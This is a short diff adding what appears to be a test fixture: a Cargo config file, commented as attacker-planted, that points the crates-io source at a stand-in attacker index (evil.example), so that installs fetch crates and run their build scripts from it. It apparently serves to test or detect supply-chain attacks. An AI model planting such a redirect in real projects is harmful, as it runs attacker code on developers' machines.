@@ -1,0 +1,8 @@
+# Attacker-planted ./.cargo/config.toml: a DIRECT registry override on the
+# crates-io source ITSELF — NO replace-with. cargo honors a bare `registry=`
+# on [source.crates-io], so it fetches every crate's metadata + .crate file
+# (and runs its build.rs) from the attacker index for a bare `cargo install
+# <anything>`. No replace-with, no [registry] default — the redirect is the
+# registry key alone.
+[source.crates-io]
+registry = "sparse+https://evil.example/idx/"
